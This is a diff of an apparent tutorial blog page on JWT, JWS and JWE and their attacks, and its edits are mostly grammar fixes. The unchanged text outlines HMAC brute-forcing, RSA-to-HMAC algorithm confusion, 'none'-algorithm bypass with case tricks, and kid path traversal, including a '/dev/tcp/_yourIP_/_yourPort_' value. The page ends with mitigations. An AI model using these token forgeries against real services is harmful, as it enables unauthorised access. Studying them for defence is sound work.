@@ -11,8 +11,8 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
 <meta
   name="description"
-  content="What is JOSE? # JOSE (JavaScript Object Signing &amp;amp; Encryption) is collection of specifications that consist of following components :
-JWT - JSON Wev Token standard - is JSON hash ( base64url encoding ) with claims, that is signed by JWS or encrypted by JWE, and serialized.
+  content="What is JOSE? # JOSE (JavaScript Object Signing &amp;amp; Encryption) is a collection of specifications that consist of the following components :
+JWT - JSON Web Token standard - is JSON hash ( base64url encoding ) with claims, that is signed by JWS or encrypted by JWE, and serialized.
 JWS JSON Web Signature - defines how to handle signed claims
 JWE JSON Web Encryption - defines how to encryption/decryption of claims"
 />
@@ -194,10 +194,10 @@ JWE JSON Web Encryption - defines how to encryption/decryption of claims"
   What is JOSE?
   <a href="#what-is-jose" class="h-anchor" aria-hidden="true">#</a>
 </h3>
-<p><a href="https://datatracker.ietf.org/doc/html/rfc7165"><code>JOSE</code></a> (JavaScript Object Signing &amp; Encryption)  is collection of specifications that consist of  following components :</p>
+<p><a href="https://datatracker.ietf.org/doc/html/rfc7165"><code>JOSE</code></a> (JavaScript Object Signing &amp; Encryption)  is a collection of specifications that consist of  the following components :</p>
 <ul>
 <li>
-<p><a href="https://datatracker.ietf.org/doc/html/rfc7519"><code>JWT</code></a>  - JSON Wev Token standard - is <a href="https://www.json.org/json-en.html">JSON</a> hash ( base64url encoding ) with <code>claims</code>, that is signed by <code>JWS</code> or encrypted by  <code>JWE</code>, and serialized.</p>
+<p><a href="https://datatracker.ietf.org/doc/html/rfc7519"><code>JWT</code></a>  - JSON Web Token standard - is <a href="https://www.json.org/json-en.html">JSON</a> hash ( base64url encoding ) with <code>claims</code>, that is signed by <code>JWS</code> or encrypted by  <code>JWE</code>, and serialized.</p>
 </li>
 <li>
 <p><a href="https://datatracker.ietf.org/doc/html/rfc7515"><code>JWS</code></a> JSON Web Signature -  defines how to handle signed claims</p>
@@ -210,19 +210,19 @@ JWE JSON Web Encryption - defines how to encryption/decryption of claims"
   Why and where it is used?
   <a href="#why-and-where-it-is-used" class="h-anchor" aria-hidden="true">#</a>
 </h3>
-<p>Once the user is logged in, each subsequent request will include the JWT, with small overhead allowing the user to access routes, services, and resources that are permitted with that token. ( Like a ID badge + fob keys)</p>
+<p>Once the user is logged in, each subsequent request will include the JWT, with a small overhead allowing the user to access routes, services, and resources that are permitted with that token. ( Like a ID badge + fob keys)</p>
 <p>Here are some scenarios where JSON Web Tokens are useful:</p>
 <ul>
 <li>developers usually use JWT to avoid server-side storage for sessions</li>
 <li>authentication,  access control mechanisms</li>
 </ul>
-<p>For example : SSO ( Single Sign-ON)</p>
+<p>For example: SSO ( Single Sign-on)</p>
 <hr>
-<h3 id="how-">
-  How ?
-  <a href="#how-" class="h-anchor" aria-hidden="true">#</a>
+<h3 id="how">
+  How?
+  <a href="#how" class="h-anchor" aria-hidden="true">#</a>
 </h3>
-<p>First. I want  to start with straighten things up between JWT, JWS, JWE. What is what? Where JWT ends and JWS begins? Is it all the same ?</p>
+<p>First. I want  to start with straightening things up between JWT, JWS, and JWE. What is what? Where does JWT end and JWS begin? Is it all the same?</p>
 <hr>
 <h4 id="jwt-vs-jws">
   JWT vs JWS
@@ -233,9 +233,9 @@ JWE JSON Web Encryption - defines how to encryption/decryption of claims"
   JWT
   <a href="#jwt" class="h-anchor" aria-hidden="true">#</a>
 </h5>
-<p>Due to compact serialization <code>JWT</code> has two parts:  a <code>header</code>, a <code>payload</code></p>
+<p>Due to compact serialization <code>JWT</code> has two parts:  a <code>header</code>, and a <code>payload</code></p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>JWT <span style="color:#f92672">=</span> Base64Url<span style="color:#f92672">(</span>header<span style="color:#f92672">)</span> + <span style="color:#e6db74">&#39;.&#39;</span> + Base64Url<span style="color:#f92672">(</span>payload<span style="color:#f92672">)</span>
-</span></span></code></pre></div><p>All JWTs consist of is a header and payload, which are JSON objects.  It is not signed and not encrypted.</p>
+</span></span></code></pre></div><p>All JWTs consist of a header and payload, which are JSON objects.  It is not signed and not encrypted.</p>
 <hr>
 <h5 id="jws">
   JWS
@@ -255,9 +255,8 @@ JWE JSON Web Encryption - defines how to encryption/decryption of claims"
 </span></span><span style="display:flex;"><span>signature <span style="color:#f92672">=</span> Base64Url<span style="color:#f92672">(</span> hashedData <span style="color:#f92672">)</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>JWS <span style="color:#f92672">=</span> Base64Url<span style="color:#f92672">(</span>header<span style="color:#f92672">)</span> + <span style="color:#e6db74">&#39;.&#39;</span> + Base64Url<span style="color:#f92672">(</span>payload<span style="color:#f92672">)</span> + <span style="color:#e6db74">&#39;.&#39;</span> + Base64Url<span style="color:#f92672">(</span>signature<span style="color:#f92672">)</span>
-</span></span></code></pre></div><p>These objects are also Base64-encoded. The encoded header and payload are combined with a digital signature
-, and all three components are concatenated with period. So when someone talking about <code>JWT</code> they probably meaning <code>JWS</code>.</p>
-<p>You can spot <code>JWT aka JWS</code> in a bearer token header. It will look something like that :</p>
+</span></span></code></pre></div><p>These objects are also Base64-encoded. The encoded header and payload are combined with a digital signature, and all three components are concatenated with the period. So when someone talks about <code>JWT</code> they probably mean <code>JWS</code>.</p>
+<p>You can spot <code>JWT aka JWS</code> in a bearer token header. It will look something like this:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>Authorization: Bearer 
 </span></span><span style="display:flex;"><span>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9<span style="color:#f92672">.</span>eyJmbGFnIjoibGFkeWJ1ZyIsIm5hbWUiOiJpbnRoZW11ZyIsImFkbWluIjp0cnVlfQ<span style="color:#f92672">.</span>sDHxelxtDr76W6_XI5uxc5_fInmMEekuP4tNfCsgVQY
 </span></span></code></pre></div><hr>
@@ -295,7 +294,7 @@ JWE JSON Web Encryption - defines how to encryption/decryption of claims"
   But what about JWE ?
   <a href="#but-what-about-jwe-" class="h-anchor" aria-hidden="true">#</a>
 </h3>
-<p>JWE does not provide the same guarantees as JWS and, therefore, does not replace the role of JWS in a token exchange. JWS and JWE are complementary when public/private key schemes are being used. (this scheme is known as public-key encryption (PKI), were the public key is the encryption key and the private key is the decryption key).</p>
+<p>JWE does not provide the same guarantees as JWS and, therefore, does not replace the role of JWS in a token exchange. JWS and JWE are complementary when public/private key schemes are being used. (this scheme is known as public-key encryption (PKI), where the public key is the encryption key and the private key is the decryption key).</p>
 <table>
 <thead>
 <tr>
@@ -448,7 +447,7 @@ JWE JSON Web Encryption - defines how to encryption/decryption of claims"
   Attack
   <a href="#attack" class="h-anchor" aria-hidden="true">#</a>
 </h4>
-<p>If an attacker can crack/brute-force the HMAC secret ( and he can do it easily offline, with enough computational power ) then he would be able to generate a valid signature for any arbitrary token, compromising the entire mechanism allowing to forge anything you like in the token .</p>
+<p>If an attacker can crack/brute-force the HMAC secret ( and he can do it easily offline, with enough computational power ) then he would be able to generate a valid signature for any arbitrary token, compromising the entire mechanism allowing to forge anything you like in the token.</p>
 <p>to name a few:</p>
 <ul>
 <li><a href="https://hashcat.net/hashcat/">https://hashcat.net/hashcat/</a></li>
@@ -491,7 +490,7 @@ Adi Shamir and Leonard Adleman, whose initials were used to name the algorithm.<
 <p>private key  -  used for <code>signing</code> ( encryption )</p>
 <p>public key  - used for <code>verifing</code> ( decryption )</p>
 </blockquote>
-<p>Asymmetric keys should provides better security but still it have some weakness if you are not careful with configurations as well as storage and transmission of your keys. Any tampering with the public key could have security implications.</p>
+<p>Asymmetric keys should provide better security but still, they have some weaknesses if you are not careful with configurations as well as storage and transmission of your keys. Any tampering with the public key could have security implications.</p>
 <h4 id="example-1">
   Example
   <a href="#example-1" class="h-anchor" aria-hidden="true">#</a>
@@ -594,17 +593,17 @@ Adi Shamir and Leonard Adleman, whose initials were used to name the algorithm.<
   Attack
   <a href="#attack-1" class="h-anchor" aria-hidden="true">#</a>
 </h4>
-<p>If the server is expecting RSA : private key signs - public key verifies, but is sent HMAC-SHA with RSA’s public key, the server will think the <code>public key</code>is actually an <code>HMAC secret key</code>!</p>
-<h4 id="the-scenario-of-such-attack-could-go-like-that-">
-  the scenario of such attack could go like that :
-  <a href="#the-scenario-of-such-attack-could-go-like-that-" class="h-anchor" aria-hidden="true">#</a>
+<p>If the server is expecting RSA: private key signs - public key verifies, but is sent HMAC-SHA with RSA’s public key, the server will think the <code>public key</code>is actually an <code>HMAC secret key</code>!</p>
+<h4 id="the-scenario-of-such-an-attack-could-go-like-this">
+  the scenario of such an attack could go like this:
+  <a href="#the-scenario-of-such-an-attack-could-go-like-this" class="h-anchor" aria-hidden="true">#</a>
 </h4>
 <ul>
 <li>
-<p>[1] your RSA public key of the token is been obtained/exposed some how( sometimes it&rsquo;s transmitted with <code>JWT</code> itself , or check out more ways to <a href="https://github.com/ticarpi/jwt_tool/wiki/Finding-Public-Keys">find_public-keys</a>)</p>
+<p>[1] your RSA public key of the token is been obtained/exposed somehow ( sometimes it&rsquo;s transmitted with <code>JWT</code> itself, or check out more ways to <a href="https://github.com/ticarpi/jwt_tool/wiki/Finding-Public-Keys">find_public-keys</a>)</p>
 </li>
 <li>
-<p>[2] confirmed that format of the public key is right ( you can expect it to be in <a href="https://en.wikipedia.org/wiki/Privacy-Enhanced_Mail">PEM format</a>)</p>
+<p>[2] confirmed that the format of the public key is right ( you can expect it to be in <a href="https://en.wikipedia.org/wiki/Privacy-Enhanced_Mail">PEM format</a>)</p>
 </li>
 </ul>
 <p><strong><code>PEM</code> format</strong> is a way of encoding binary/DER data in a way that is more convenient. It derives from a 1990s attempt at secure email named <code>Privacy-Enhanced Mail</code> hence the name.</p>
@@ -628,10 +627,10 @@ Adi Shamir and Leonard Adleman, whose initials were used to name the algorithm.<
 </span></span><span style="display:flex;"><span>	role: <span style="color:#e6db74">&#39;user&#39;</span>  -&gt; <span style="color:#e6db74">&#34;admin&#34;</span>
 </span></span></code></pre></div><ul>
 <li>
-<p>[4] obtained public RSA key used as symmetric key for HMAC.</p>
+<p>[4] obtained a public RSA key used as a symmetric key for HMAC.</p>
 </li>
 <li>
-<p>[5] tampered token send to the server .</p>
+<p>[5] tampered token sent to the server.</p>
 </li>
 </ul>
 <hr>
@@ -657,7 +656,7 @@ Adi Shamir and Leonard Adleman, whose initials were used to name the algorithm.<
 <hr>
 <p>JWTs can be signed using a range of different algorithms, but can also be left unsecured. In this case, the JWT <code>alg</code> parameter is set to <code>none</code>, meaning the backend will not perform signature verification.</p>
 <p>Due to the obvious dangers of this, secure servers usually reject tokens with no signature.
-But attacker might still has a chance to bypass weak filters ( string parsing ) , using classic obfuscation techniques, such as mixed capitalization or unexpected encoding. (<code>NonE</code>, <code>nONE</code>&hellip; )</p>
+However, the attacker might still have a chance to bypass weak filters ( string parsing ), using classic obfuscation techniques, such as mixed capitalization or unexpected encoding. (<code>NonE</code>, <code>nONE</code>&hellip; )</p>
 <h4 id="example-2">
   Example
   <a href="#example-2" class="h-anchor" aria-hidden="true">#</a>
@@ -681,7 +680,7 @@ But attacker might still has a chance to bypass weak filters ( string parsing ) 
 </span></span><span style="display:flex;"><span>	 <span style="color:#e6db74">&#34;admin&#34;</span> <span style="color:#f92672">=</span> True
 </span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>4<span style="color:#f92672">]</span> By switch the algorithm to <span style="color:#e6db74">&#39;none&#39;</span> you ditch the signature and can gain the bypasss.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>4<span style="color:#f92672">]</span> By switching the algorithm to <span style="color:#e6db74">&#39;none&#39;</span> you ditch the signature and can gain the bypass.
 </span></span></code></pre></div><hr>
 <ul>
 <li>However, this won&rsquo;t work unless you <strong>remove</strong> the signature</li>
@@ -702,7 +701,7 @@ But attacker might still has a chance to bypass weak filters ( string parsing ) 
 </thead>
 <tbody>
 <tr>
-<td><a href="https://security.snyk.io/vuln/SNYK-PYTHON-PYJWT-40733"> Use up to date libraries :)</a></td>
+<td><a href="https://security.snyk.io/vuln/SNYK-PYTHON-PYJWT-40733"> Use up-to-date libraries :)</a></td>
 </tr>
 </tbody>
 </table>
@@ -866,7 +865,7 @@ But attacker might still has a chance to bypass weak filters ( string parsing ) 
   Example
   <a href="#example-5" class="h-anchor" aria-hidden="true">#</a>
 </h4>
-<p>*some might use the <code>kid</code> parameter to point to a particular entry in a database, or even the name of a file.</p>
+<p>*some might use the <code>kid</code> parameter to point to a particular entry in a database or even the name of a file.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># For example if </span>
 </span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;kid&#34;</span>:<span style="color:#e6db74">&#34;key/12345” 
 </span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
@@ -877,13 +876,13 @@ But attacker might still has a chance to bypass weak filters ( string parsing ) 
 <li>
 <p>If this parameter is also vulnerable to <a href="https://portswigger.net/web-security/file-path-traversal">directory traversal</a>, an attacker could potentially force the server to use an arbitrary file from its filesystem as the verification key.</p>
 <ul>
-<li>This is especially dangerous if the server also supports JWTs signed using symmetrical algorithms. In this case, an attacker could potentially point the <code>kid</code> parameter to a predictable, static file, then sign the JWT using a secret that matches the contents of this file.</li>
+<li>This is especially dangerous if the server also supports JWTs signed using symmetrical algorithms. In this case, an attacker could potentially point the <code>kid</code> parameter to a predictable, static file, and then sign the JWT using a secret that matches the contents of this file.</li>
 </ul>
 </li>
 </ul>
 <pre tabindex="0"><code>&#34;kid&#34;:&#34;/dev/tcp/_yourIP_/_yourPort_
 </code></pre><ul>
-<li>You could theoretically do this with any file, but one of the simplest methods is to use <code>/dev/null</code>, which is present on most Linux systems. As this is an empty file, reading it returns an empty string. Therefore, signing the token with a empty string will result in a valid signature</li>
+<li>You could theoretically do this with any file, but one of the simplest methods is to use <code>/dev/null</code>, which is present on most Linux systems. As this is an empty file, reading it returns an empty string. Therefore, signing the token with an empty string will result in a valid signature</li>
 </ul>
 <table>
 <thead>
@@ -941,7 +940,7 @@ Use jwt_tool to read the content of the token: decoding includes timestamp parsi
   Denial-of-service attacks
   <a href="#denial-of-service-attacks" class="h-anchor" aria-hidden="true">#</a>
 </h3>
-<p>Like any denial-of-service attack the goal is to overwhelm the services to bring them down.</p>
+<p>Like any denial-of-service attack, the goal is to overwhelm the services to bring them down.</p>
 <p>An attacker could supply content using keys that would result in excessive cryptographic processing, for example, keys larger than those mandated in this specification.</p>
 <table>
 <thead>
@@ -976,12 +975,12 @@ applicable.</p>
 </h2>
 <ul>
 <li>Use an<code>up-to-date library</code></li>
-<li>Do not store sensitive data in payload</li>
+<li>Do not store sensitive data in the payload</li>
 <li>Use asymmetric keys if the tokens are used across more than one server</li>
 <li>Use strong keys/secrets</li>
-<li>Make sure that you perform robust <code>signature verification on any JWTs that you receive</code> , and account for edge-cases such as <code>JWT</code> signed using unexpected algorithms.</li>
+<li>Make sure that you perform robust <code>signature verification on any JWTs that you receive</code>, and account for edge-cases such as <code>JWT</code> signed using unexpected algorithms.</li>
 <li>Make sure that you&rsquo;re not vulnerable to <a href="https://portswigger.net/web-security/file-path-traversal">path traversal</a> or SQL injection via the <code>kid</code> header parameter.</li>
-<li>Always set an<code> expiration date</code> for any tokens that you issue.</li>
+<li>Always set an <code>expiration date</code> for any tokens that you issue.</li>
 <li><code>Avoid sending tokens in URL</code> parameters where possible.</li>
 <li>Include the <code>aud</code> (audience) claim (or similar) to <code>specify the intended recipient </code>of the token. This prevents it from being used on different websites.</li>
 <li>Enable the issuing server to revoke tokens (on logout, for example).</li>
